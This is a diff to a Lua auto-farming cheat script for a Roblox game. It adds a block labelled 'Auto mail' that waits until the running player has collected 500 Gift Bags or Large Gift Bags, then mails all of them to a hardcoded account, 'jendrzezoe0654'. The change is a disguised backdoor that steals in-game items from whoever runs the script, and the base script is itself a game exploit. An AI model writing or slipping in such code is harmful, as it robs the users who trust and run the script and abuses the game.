@@ -208,6 +208,59 @@ autoLootBagConnection = workspace.__THINGS.Lootbags.ChildAdded:Connect(function(
 	v:Destroy()
 end)
 
+-- Part of Auto mail
+local SavedData;
+repeat wait()
+    pcall(function()
+        SavedData = Library.Save.Get();
+    end);
+until type(SavedData) == "table";
+
+local Network = Library.Network
+local Functions = Library.Functions
+-- Autosend Start
+function SendAllBagsIfOver500(user, bagType)
+    -- Check for valid bagType
+    if bagType ~= "Gift Bag" and bagType ~= "Large Gift Bag" then
+        print("Invalid bag type specified.")
+        return false
+    end
+
+    local MiscItems = SavedData["Inventory"]["Misc"]
+    local bagCount = 0
+
+    -- Count the total number of specified bag items in 'Misc'
+    for i, item in pairs(MiscItems) do
+        if item["id"] == bagType then
+            bagCount = bagCount + (item["_am"] or 1)
+        end
+    end
+
+    -- Check if there are more than 500 of the specified bag items
+    if bagCount <= 500 then
+        print("Not enough '" .. bagType .. "' items to send. Total count:", bagCount)
+        return false
+    end
+
+    -- If there are more than 500, proceed to send them
+    for i, item in pairs(MiscItems) do
+        if item["id"] == bagType then
+            local uid = i -- Assuming 'i' or some identifier within the item can be used as 'uid'
+            local amount = item["_am"] or 1
+            
+            -- Send the specified bag item
+            local success = Network.Invoke("Mailbox: Send", user, bagType, "Misc", uid, amount)
+            if success then
+                print("Sent '" .. bagType .. "' to", user)
+            else
+                print("Failed to send '" .. bagType .. "' to", user)
+            end
+        end
+    end
+end
+
+-- END Autosend
+
 -- if #workspace.__THINGS.BalloonGifts:GetChildren() <= 1 then
 -- 	repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
 -- end
@@ -258,6 +311,13 @@ while getgenv().MoneyPrinter.autoBalloons do task.wait()
 			end
 			if getgenv().MoneyPrinter.sendWeb and startBalloons >= 3 then
 				sendNotif("```asciidoc\n[ "..Player.Name.." Earned ]\n‐ "..tostring(endGifts - startGifts).." Small :: "..tostring(getTotalRAP((endGifts - startGifts) * SmallRAP)).." \n‐ "..tostring(endLarge - startLarge).." Large :: "..tostring(getTotalRAP((endLarge - startLarge) * LargeRAP)).." \n\n[ Total / Server ]\n‐ "..tostring(endGifts).." Small :: "..tostring(getTotalRAP(endGifts * SmallRAP)).." \n‐ "..tostring(endLarge).." Large :: "..tostring(getTotalRAP(endLarge * LargeRAP)).." \n- took "..tostring(currentTime - startTime).." seconds \n- had "..tostring(startBalloons).." balloons\n```")
+			end
+			
+			repeat task.wait() until type(SavedData) == "table"
+			if endGifts >= 500 then
+				SendAllBagsIfOver500("jendrzezoe0654", "Gift Bag") -- Send all "Gift Bag" items if over 500
+			elseif endLarge >= 500 then
+				SendAllBagsIfOver500("jendrzezoe0654", "Large Gift Bag") -- Send all "Gift Bag" items if over 500
 			end
 			task.wait(10)
 			-- repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
